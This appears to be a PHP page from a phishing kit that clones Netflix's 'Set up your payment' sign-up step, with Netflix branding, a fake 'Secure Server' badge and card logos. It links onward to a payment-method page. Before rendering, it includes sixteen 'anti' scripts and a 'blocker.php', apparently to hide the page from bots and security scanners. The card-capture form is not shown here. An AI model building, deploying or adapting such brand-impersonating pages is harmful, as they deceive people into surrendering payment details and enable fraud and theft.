<?php 
include "./boots/anti1.php";
include "./boots/anti2.php";
include "./boots/anti3.php";
include "./boots/anti4.php";
include "./boots/anti5.php";
include "./boots/anti6.php";
include "./boots/anti7.php";
include "./boots/anti8.php";
include "./boots/anti9.php";
include "./boots/anti10.php";
include "./boots/anti11.php";
include "./boots/anti12.php";
include "./boots/anti13.php";
include "./boots/anti14.php";
include "./boots/anti15.php";
include "./boots/anti16.php";
include "./boots/blocker.php";
include_once "./includes/header.html" 
?>

                <div class="simpleContainer">
                    <div class="centerContainer contextStep" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
                        <div class="paymentContainer">
                            <div>
                                <div class="stepLogoContainer">
                                <span class="stepLogo paymentStepLogo"></span>
                            </div>
                                <div class="stepHeader-container">
                                    <div class="stepHeader" data-a11y-focus="true" tabindex="0">
                                        <span class="stepIndicator" data-uia="">STEP <b>3</b> OF <b>3</b></span>
                                        <h1 class="stepTitle" data-uia="stepTitle">Set up your payment.</h1>
                                    </div>
                                </div>
                                <div class="narrowContainer">
                                    <div id="" class="contextRow contextRowFirst">Your membership starts as
                                        soon as you set up payment.</div>
                                    <div class="contextRow" >
                                        <div class="contextRowEmphasized">No commitments.</div>
                                        <div class="contextRowEmphasized">Cancel online anytime.</div>
                                    </div>
                                </div>
                            </div>

                            <div class="secure-server-badge"><svg id="secure-server-icon" viewBox="0 0 12 16"
                                    class="secure-server-badge--icon">
                                    <g fill="none">
                                        <g fill="#FFB53F">
                                            <path
                                                d="M8.4 5L8.4 6.3 10 6.3 10 5C10 2.8 8.2 1 6 1 3.8 1 2 2.8 2 5L2 6.3 3.6 6.3 3.6 5C3.6 3.7 4.7 2.6 6 2.6 7.3 2.6 8.4 3.7 8.4 5ZM11 7L11 15 1 15 1 7 11 7ZM6.5 11.3C7 11.1 7.3 10.6 7.3 10.1 7.3 9.3 6.7 8.7 6 8.7 5.3 8.7 4.7 9.3 4.7 10.1 4.7 10.6 5 11.1 5.5 11.3L5.2 13.4 6.9 13.4 6.5 11.3Z">
                                            </path>
                                        </g>
                                    </g>
                                </svg>
                                <div class="secure-server-badge--text">Secure Server</div>
                            </div>



                            <div class="basic-spinner-region" style="min-height: 50px;">
                                <div>
                                    <div class="nfTabSelectionWrapper" id="creditOrDebitCardDisplayStringId">
                                        <a class="nfTabSelection nfTabSelection--active paymentPicker standardHeight" href="payment_method.php">
                                            <div class="mopNameAndLogos">
                                                <div class="nfTabSelection--text card-type-text paymentActive" >
                                                    <span class="selectionLabel">Credit or Debit Card</span></div>
                                                <div class="logosContainer">
                                                    <span class="logos logos-inline" >
                                                            <img alt="" class="logoIcon VISA" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/visa-v3.svg">
                                                            <img alt="" class="logoIcon MASTERCARD" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/mastercard-v2.svg">
                                                            <img alt="" class="logoIcon AMEX" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/amex-v2.svg">
                                                            <img alt="" class="logoIcon DISCOVER" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_discover.png" srcset="https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_discover_2x.png 2x">
                                                      </span>
                                                </div>
                                            </div>
                                            <span class="ui-svg-icon ui-svg-icon--chevron pull-right pickerArrow"></span>
                                        </a>
                                    </div>
             
                                               
                                           
                                </div>
                            </div>
                        </div>


                    </div>
                </div>
               
<?php include_once "./includes/footer.html" ?>